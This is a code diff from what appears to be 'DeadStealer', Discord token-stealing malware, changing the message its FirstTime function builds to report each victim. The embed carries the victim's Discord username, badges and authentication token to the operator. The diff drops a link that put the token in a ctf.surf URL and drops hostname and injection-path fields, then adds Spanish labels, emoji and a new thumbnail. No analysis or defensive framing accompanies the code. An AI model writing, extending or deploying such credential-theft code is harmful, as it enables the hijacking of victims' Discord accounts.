@@ -101,27 +101,18 @@ function FirstTime() {
 							username: "DeadStealer",
 							content: "",
 							embeds: [{
-								title: "Discord Inicializado",
-								description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +")",
-								color: config["embed-color"],
+								title: 'DeadStealer',
+								color: 0xFF0300,
 								fields: [{
-									name: "Info",
-									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
-									inline: !1
+									name: '<:black_joker:926273784305045526> Usuario',
+                                                                        value: `\`${b.username}#${b.discriminator}\``,
+                                                                        inline: !0
 								}, {
-									name: "Nombre",
-									value: `\`${b.username}#${b.discriminator}\``,
-									inline: !0
-								}, {
-									name: "ID",
-									value: `\`${b.id}\``,
-									inline: !0
-								}, {
-									name: "Badges",
+									name: '<:black_playboy:926268704000475196> Insignias',
 									value: `${GetBadges(b.flags)}`,
-									inline: !1
+									inline: !0
 								}, {
-									name: "Token",
+									name: '<:black_mask:926268629245390879> Token',
 									value: `\`\`\`${token}\`\`\``,
 									inline: !1
 								}],
@@ -132,7 +123,7 @@ function FirstTime() {
 									text: "Gracias por utilizar DeadStealer"
 								},
 								thumbnail: {
-									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
+									url: `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 								}
 							}]
 						};
